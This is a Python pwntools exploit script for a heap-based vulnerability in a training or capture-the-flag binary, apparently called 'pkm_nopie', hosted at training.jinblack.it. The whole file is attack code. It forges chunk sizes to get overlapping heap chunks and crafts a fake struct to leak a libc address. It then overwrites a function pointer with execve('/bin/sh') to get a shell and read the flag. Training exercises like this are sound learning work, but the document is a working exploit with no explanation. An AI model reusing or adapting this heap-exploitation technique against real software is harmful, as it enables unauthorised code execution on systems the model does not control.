#!/usr/bin/python3
from pwn import *
import re
PROGRAM = "./pkm_nopie"
HOST    = "training.jinblack.it"
PORT    = 2025 
LIBC    = "./libc-2.27_notcache.so"
libc = ELF(LIBC)

#NX     
#PIE    
#ASLR   

# GDB_c   = """
#     b* 0x401ca4
    
#     command 1
#     x /20gx 0x4040c0 
#     end 
#           """

#b* 0x4013cb  

GDB_c = """
    b* 0x401D42
    b* 0x401A4F
    command 1
    silent
    heap
"""
if args.GDB:
    r = process(PROGRAM)
    gdb.attach(r, GDB_c)
    input("[!] Waiting for gdb...")
elif args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(PROGRAM)


pkm_index = 0
free_indexes = []


def add_pkm():
    r.recvuntil("> ")
    r.sendline(b"0")
    r.recvuntil("[*] New PKM!")
    if len(free_indexes) == 0:
            
        global pkm_index 
        pkm_index += 1 
        assert(pkm_index < 51)
        print("Created pkm ", pkm_index-1)
        return pkm_index - 1 
    else:
        index = free_indexes.pop()
        print("Created pkm ",index )
        return index 


def rename_pkm(length, name, index):
    #this function sends only bytes - 
    assert(length == len(name) or name.find("\n"))
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("[*] Rename PKM!")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    r.recvuntil("[.] insert length: ")
    r.sendline((str(length)).encode())
    print("WARNING: process reads one char at a time")
    print("We don't want to send new line! -> r.send()")
    r.send(name.encode())
    print("Renamed pkm ", index)

def rename_pkm_bytes(length, name, index):
    #this function sends only bytes - 
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("[*] Rename PKM!")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    r.recvuntil("[.] insert length: ")
    r.sendline((str(length)).encode())
    print("WARNING: process reads one char at a time")
    print("We don't want to send new line! -> r.send()")
    r.sendline(name)
    print("Renamed pkm ", index)

def rename_send(name, index):
    rename_pkm(len(name), name, index)

def rename_sendline(name, index):
    rename_pkm(len(name)+1, name+"\n", index)

def delete_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"2")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    free_indexes.append(index)
    print("Deleted pkm ", index)

def debug():
    r.recvuntil("> ")
    r.sendline(b"9")    

def info_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"4")
    r.recvuntil("[*] Info PKMs!")
    r.recvuntil("[*] Choice a PKM!")
    info = r.recvuntil("> ")
    r.sendline((str(index)).encode())
    print("Info on pkm ", index)
    print(r.recvuntil(" *Moves:"))
    #clean input for the following functions
    r.recvuntil("> ")
    r.sendline((str("7")).encode())
    r.recvuntil("[!] Wrong choice!")
    return info

def fight_pkm(pkm, move, victim_pkm):
    r.recvuntil("> ")
    r.sendline(b"3")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(pkm)).encode())
    r.recvuntil("[*] Choice a Move!")
    r.recvuntil("> ")
    r.sendline((str(move).encode()))
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(victim_pkm)).encode())
    



size_pkm = 0x100
# fake_size = size & (~0x0000ff)

pkA = add_pkm()
pkB = add_pkm()
pkC = add_pkm()
pkD = add_pkm()
pkE = add_pkm()

#1
rename_sendline("A"*0x40, pkA)

#2
size_B = 0x220
fake_size = size_B & (~0x0000ff)
# print(p64(fake_size).decode(), p64(fake_size))
payload = ("B"*(fake_size-0x10)) + p64(fake_size).decode()
payload = payload.ljust(size_B, "B")
rename_sendline( payload, pkB)

#3
pkmF = add_pkm()

# rename_sendline("C"*0x40, pkC)

#3 bis
# pkmF = add_pkm()

#4
delete_pkm(pkB)

#forse devo mettere un pkm prima
#5

rename_send("F"*(0x40+8), pkA)



#6
pk_V0 = add_pkm()

pk_V1 = add_pkm()

pk_V2 = add_pkm()

#7
delete_pkm(pk_V1)


#8
delete_pkm(pkmF)

# delete_pkm(pkC)


#9

chunk_struct = {}
chunk_struct['metadata0'] = p64(0x100)
chunk_struct['chunk_size'] = p64(0x100)


pkm = {}
pkm['atk'] = p64(40)
pkm['defense'] = p64(40)
pkm['hp'] = p64(140)
pkm['max_hp'] = p64(140)
pkm['status'] = p64(0)
pkm['name_ptr'] = p64(0x404018)
pkm['IV_0'] = p64(0xdeadbeef)
pkm['IV_1'] = p64(0xdeadbeef)
pkm['IV_2'] = p64(0xdeadbeef)
pkm['IV_3'] = p64(0xdeadbeef)
pkm['IV_4'] = p64(0xdeadbeef)

#mov
#name
#function_address
pkm['move_0'] = p64(0x40203A) + p64(0xfcfcfcfc)
pkm['move_1'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_2'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_3'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_4'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_6'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_7'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_8'] = p64(0xaaaaaaaa) + p64(0)
pkm['move_9'] = p64(0xaaaaaaaa) + p64(0)

print("Crafting fake pkm....")
payload = b"W"*(size_pkm -0x10)

for v in chunk_struct:
    payload += chunk_struct[v]
for v in pkm:
    payload += pkm[v]

# print(payload, len(payload))

rename_pkm_bytes(len(payload)+1, payload, pkD)
# rename_sendline("W"*size_pkm*2, pkD)
# print("Fake pkm sent!")


#10
info = info_pkm(pk_V2)

leak = u64(info[-9:-3:] + b"\x00\x00") 
print(hex(leak))

libc.address = leak - libc.symbols['free'] 
print("LEAK LIBC: ", hex(libc.address))
#####

one_gadget = [0x4e475, 0x4e4d2, 0x1053d1]
binsh = next(libc.search(b"/bin/sh\x00"))
bincsh = next(libc.search(b"/bin/csh\x00"))

ls = next(libc.search(b"ls\x00"))
null = next(libc.search(b"\x00"*8))
payload = b"W"*(size_pkm -0x10)

pkm['move_0'] = p64(0) + p64(libc.symbols['execve'])
pkm['name_ptr'] = p64(binsh)
pkm['atk'] = b"/bin/sh\x00"

print(binsh, hex(binsh), p64(binsh))

for v in chunk_struct:
    payload += chunk_struct[v]
for v in pkm:
    payload += pkm[v]

# print(payload, len(payload))


rename_pkm_bytes(len(payload)+1, payload, pkD)






pkA_ = add_pkm()
pkB_ = add_pkm()
pkC_ = add_pkm()
pkD_ = add_pkm()
pkE_ = add_pkm()

#1
rename_sendline("A"*0x40, pkA_)

#2
size_B = 0x220
fake_size = size_B & (~0x0000ff)
# print(p64(fake_size).decode(), p64(fake_size))
payload = ("B"*(fake_size-0x10)) + p64(fake_size).decode()
payload = payload.ljust(size_B, "B")
rename_sendline( payload, pkB_)

#3
pkmF_ = add_pkm()

# rename_sendline("C"*0x40, pkC)

#3 bis
# pkmF = add_pkm()

#4
delete_pkm(pkB_)

#forse devo mettere un pkm prima
#5

rename_send("F"*(0x40+8), pkA_)



#6
pk_V0_ = add_pkm()

pk_V1_ = add_pkm()

pk_V2_ = add_pkm()

#7
delete_pkm(pk_V1_)


#8
delete_pkm(pkmF_)

# delete_pkm(pkC)

#9

print("Crafting fake pkm....")
payload = b"W"*(size_pkm -0x10)

pkm['atk'] = p64(0)

for v in chunk_struct:
    payload += chunk_struct[v]
for v in pkm:
    payload += pkm[v]

# print(payload, len(payload))

rename_pkm_bytes(len(payload)+1, payload, pkD_)




fight_pkm(pk_V2, 0, pk_V2_)

r.sendline("cat flag")
r.interactive()

# print( r.recvuntil("\n"))
# mess =  r.recvuntil("\n")
# print(hex(u64(mess[7:13]+b"\x00\x00")))
# r.sendline("cat flag")
# print(r.recvall())
